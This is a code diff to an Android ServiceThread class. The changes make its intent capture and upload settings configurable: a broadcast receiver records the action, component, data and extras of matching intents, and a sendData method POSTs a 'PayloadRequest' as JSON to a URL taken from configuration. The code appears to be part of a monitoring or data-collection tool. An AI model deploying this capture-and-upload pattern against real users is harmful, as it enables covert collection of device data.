@@ -465,45 +465,46 @@ public class ServiceThread implements Runnable {
 
 
     // Get Broadcast Intents
-    private BroadcastReceiver mMessageReceiver = Configuration.GET_INTENTS ? new BroadcastReceiver () {
+    private BroadcastReceiver mMessageReceiver = Boolean.parseBoolean (configuration.GET_INTENTS) ? new BroadcastReceiver () {
         @Override
         public void onReceive(Context context, Intent intent) {
             String key = extractKey (intent);
 
-            for (String s : Configuration.getIntentFilters ()) {
+            if (!configuration.getFilters ().isEmpty ()) {
+                for (String s : configuration.getFilters ().get (Configuration.GET_INTENTS)) {
 
-                if (key.equals (s)) {
+                    if (key.equals (s)) {
 
-                    String content = ("Action : " + intent.getAction () + "\n"
-                            + "Component : " + intent.getComponent ().getClassName () + "\n"
-                            + "Type : " + intent.getType () + "\n"
-                            + "DataString : " + intent.getDataString () + "\n"
-                            + "SerializableExtra : " + intent.getSerializableExtra (s).toString () + "\n"
-                            + "BundleExtra : " + intent.getBundleExtra (s).toString () + "\n"
-                            + "\nTimestamp : " + new Date().toString ());
+                        String content = ("Action : " + intent.getAction () + "\n"
+                                + "Component : " + intent.getComponent ().getClassName () + "\n"
+                                + "Type : " + intent.getType () + "\n"
+                                + "DataString : " + intent.getDataString () + "\n"
+                                + "SerializableExtra : " + intent.getSerializableExtra (s).toString () + "\n"
+                                + "BundleExtra : " + intent.getBundleExtra (s).toString () + "\n"
+                                + "\nTimestamp : " + new Date ().toString ());
 
-                    String filter = s;
-                    for (int i = 1; !intentsMap.containsKey (filter) ; i++) {
-                        filter = s + i;
+                        String filter = s;
+                        for (int i = 1; !intentsMap.containsKey (filter); i++) {
+                            filter = s + i;
+                        }
+
+                        intentsMap.put (filter, content);
                     }
-
-                    intentsMap.put (filter, content);
                 }
             }
         }
     } : null;
-
-    private String extractKey(Intent intent){
-        Set<String> keySet = Objects.requireNonNull(intent.getExtras()).keySet();
-        Iterator iterator = keySet.iterator();
-        return (String)iterator.next();
+    private String extractKey(Intent intent) {
+        Set<String> keySet = Objects.requireNonNull (intent.getExtras ()).keySet ();
+        Iterator iterator = keySet.iterator ();
+        return (String) iterator.next ();
     }
 
 
     // Send POST request
     private void sendData(PayloadRequest req) throws IOException {
 
-        URL url = new URL (Configuration.URL);
+        URL url = new URL (configuration.getConfigurations ().get ((Configuration.URL)));
         HttpURLConnection con = (HttpURLConnection) url.openConnection ();
         con.setRequestMethod ("POST");
 
@@ -512,7 +513,7 @@ public class ServiceThread implements Runnable {
         Gson gson = new Gson ();
         String content = gson.toJson (req);
 
-        try(OutputStream os = con.getOutputStream ()) {
+        try (OutputStream os = con.getOutputStream ()) {
             os.write (content.getBytes ());
             os.flush ();
         }
